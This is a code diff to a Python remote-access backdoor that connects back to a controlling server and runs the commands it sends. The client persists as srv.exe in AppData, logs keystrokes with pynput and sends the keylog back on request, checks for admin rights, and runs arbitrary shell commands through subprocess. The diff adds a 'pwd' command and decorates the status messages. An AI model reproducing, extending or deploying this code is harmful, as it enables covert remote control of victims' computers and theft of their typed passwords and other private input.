@@ -13,10 +13,10 @@ from mss import mss
 import threading
 import pynput.keyboard
 
-server_ip = "10.0.2.15"
+server_ip = "localhost"
 server_port = 54321
 file_location = os.environ["appdata"] + "\\srv.exe"
-image_file = "\\dog.jpg"
+image_file = "\\image.png"
 keylog_file = os.environ["appdata"] + "\\srv.txt"
 captured_keys = ""
 
@@ -130,15 +130,17 @@ def handle_communication():
         elif command[:5] == "check":
             try:
                 os.listdir(os.sep.join([os.environ.get('SystemRoot', 'C:\windows'), 'temp']))
-                send_data("[+] Great, you have admin privilege!")
+                send_data("[bold green] [+] Great, you have admin privilege! [/bold green] :smiley:")
             except:
-                send_data("[!!] Sorry, you are not admin!")
+                send_data("[bold red] [!!] You do NOT have admin privilege! [/bold red] :pile_of_poo:")
         elif command[:12] == "keylog_start":
             kl_thread = threading.Thread(target=keylogger_start)
             kl_thread.start()
         elif command[:11] == "keylog_dump":
             with open(keylog_file, "r") as kl:
                 send_data(kl.read())
+        elif command[:3] == "pwd":
+            send_data(os.getcwd())
         else:
             proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
             response = proc.stdout.read() + proc.stderr.read()
